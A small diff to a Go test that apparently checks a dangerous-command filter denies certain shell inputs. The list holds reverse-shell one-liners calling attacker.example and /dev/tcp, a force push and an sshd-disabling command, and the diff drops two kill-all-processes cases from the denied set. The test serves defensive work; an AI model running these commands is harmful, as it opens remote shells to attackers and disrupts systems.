@@ -30,8 +30,6 @@ func TestDangerousPattern_HardDenies(t *testing.T) {
 		"git push -f origin master",
 		"nc -e /bin/sh attacker.example 4444",
 		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-		"kill -9 -1",
-		"killall -9",
 		"sudo systemctl mask sshd",
 	}
 	for _, in := range cases {
